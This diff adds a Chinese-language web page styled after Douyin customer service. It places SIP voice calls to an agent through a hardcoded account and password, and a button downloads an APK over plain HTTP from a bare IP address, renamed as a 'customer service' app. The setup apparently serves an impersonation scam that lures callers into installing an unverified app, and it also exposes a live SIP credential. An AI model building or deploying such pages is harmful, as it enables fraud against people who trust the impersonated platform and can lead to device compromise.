@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>抖音风格网页呼叫客服</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@600&display=swap');
+    
+    body {
+      margin: 0;
+      height: 100vh;
+      background: linear-gradient(135deg, #f20000, #ff4141);
+      font-family: 'Montserrat', Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      user-select: none;
+    }
+    .container {
+      background: #fff;
+      width: 360px;
+      max-width: 95vw;
+      border-radius: 30px;
+      padding: 30px 20px;
+      box-shadow: 0 15px 30px rgba(0,0,0,0.3);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      color: #333;
+    }
+    .avatar {
+      width: 100px;
+      height: 100px;
+      border-radius: 50%;
+      border: 4px solid #ff4141;
+      overflow: hidden;
+      margin-bottom: 25px;
+      box-shadow: 0 4px 10px rgba(242,0,0,0.6);
+      background: #eee;
+      flex-shrink: 0;
+    }
+    .avatar img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+    h1 {
+      margin: 0 0 25px;
+      font-weight: 700;
+      font-size: 24px;
+      color: #222;
+      text-align: center;
+    }
+    button {
+      width: 260px;
+      height: 60px;
+      font-size: 22px;
+      font-weight: 700;
+      border-radius: 35px;
+      border: none;
+      cursor: pointer;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+      margin: 12px 0;
+      transition: all 0.3s ease;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    #callButton {
+      background: #27ae60;
+      color: white;
+      box-shadow: 0 5px 20px #27ae60cc;
+    }
+    #callButton:disabled {
+      background: #a2d3af;
+      box-shadow: none;
+      cursor: not-allowed;
+      color: #eee;
+    }
+    #hangupButton {
+      background: #e74c3c;
+      color: white;
+      box-shadow: 0 5px 20px #e74c3ccc;
+    }
+    #hangupButton:disabled {
+      background: #f1a2a0;
+      box-shadow: none;
+      cursor: not-allowed;
+      color: #eee;
+    }
+    #downloadApkButton {
+      background: #3498db;
+      color: white;
+      box-shadow: 0 5px 20px #3498dbcc;
+      font-size: 18px;
+      height: 50px;
+      width: 180px;
+      margin-top: 20px;
+    }
+    #callStatus {
+      margin-top: 15px;
+      font-weight: 600;
+      font-size: 20px;
+      color: #555;
+      min-height: 28px;
+    }
+    audio {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="avatar">
+      <img src="https://p1.music.126.net/yt2mMmAar7c_Lv6H8gnPXg==/109951166888490096.jpg" alt="客服头像" />
+    </div>
+
+    <h1>在线客服，随时为您服务</h1>
+
+    <button id="callButton" onclick="makeCall()">📞 呼叫客服</button>
+    <button id="hangupButton" onclick="hangupCall()" disabled>🛑 挂断通话</button>
+    <button id="downloadApkButton">⬇️ 下载APP</button>
+
+    <div id="callStatus">未呼叫</div>
+    <audio id="audioRemote" autoplay></audio>
+  </div>
+
+  <!-- 必要的 JsSIP 和 adapter -->
+  <script src="https://webrtc.github.io/adapter/adapter-latest.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/jssip@3.0.10/dist/jssip.min.js"></script>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      const socket = new JsSIP.WebSocketInterface('wss://xin.anjre.cn:8089/ws');
+
+      const configuration = {
+        sockets: [socket],
+        uri: 'sip:80000@xin.anjre.cn',
+        password: 'Aa6363463@',
+        display_name: '网页客户',
+        session_timers: false,
+        register: true
+      };
+
+      const ua = new JsSIP.UA(configuration);
+      let session = null;
+      let isCalling = false;
+
+      ua.on('connected', () => console.log('✅ 已连接到 SIP WebSocket'));
+      ua.on('registered', () => console.log('✅ 注册成功'));
+      ua.on('registrationFailed', e => console.error('❌ 注册失败', e));
+      ua.on('disconnected', () => console.log('❗️ WebSocket 断开'));
+      ua.start();
+
+      const callButton = document.getElementById('callButton');
+      const hangupButton = document.getElementById('hangupButton');
+      const statusDisplay = document.getElementById('callStatus');
+      const remoteAudio = document.getElementById('audioRemote');
+
+      function updateStatus(text) {
+        statusDisplay.textContent = text;
+      }
+
+      window.makeCall = function () {
+        if (isCalling) return;
+
+        isCalling = true;
+        callButton.disabled = true;
+        hangupButton.disabled = false;
+        updateStatus("正在呼叫...");
+
+        session = ua.call('sip:10011@xin.anjre.cn', {
+          mediaConstraints: { audio: true, video: false },
+          rtcOfferConstraints: {
+            offerToReceiveAudio: 1,
+            offerToReceiveVideo: 0
+          }
+        });
+
+        session.connection.addEventListener('addstream', function (e) {
+          remoteAudio.srcObject = e.stream;
+          remoteAudio.play().catch(err => console.warn('自动播放失败:', err));
+        });
+
+        session.on('progress', () => updateStatus("振铃中..."));
+        session.on('accepted', () => updateStatus("通话中"));
+        session.on('ended', () => {
+          updateStatus("通话结束");
+          resetUI();
+        });
+        session.on('failed', (e) => {
+          updateStatus("呼叫失败");
+          console.error('呼叫失败:', e);
+          resetUI();
+        });
+      };
+
+      window.hangupCall = function () {
+        if (session) {
+          session.terminate();
+        }
+      };
+
+      function resetUI() {
+        isCalling = false;
+        callButton.disabled = false;
+        hangupButton.disabled = true;
+        session = null;
+      }
+
+      // 下载 APK
+      const downloadApkButton = document.getElementById('downloadApkButton');
+      downloadApkButton.addEventListener('click', () => {
+        const url = 'http://47.98.19.153/Android_8.9.28.10155_537147618_64.apk';
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = 'Android_客服通.apk';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+      });
+
+    });
+  </script>
+</body>
+</html>
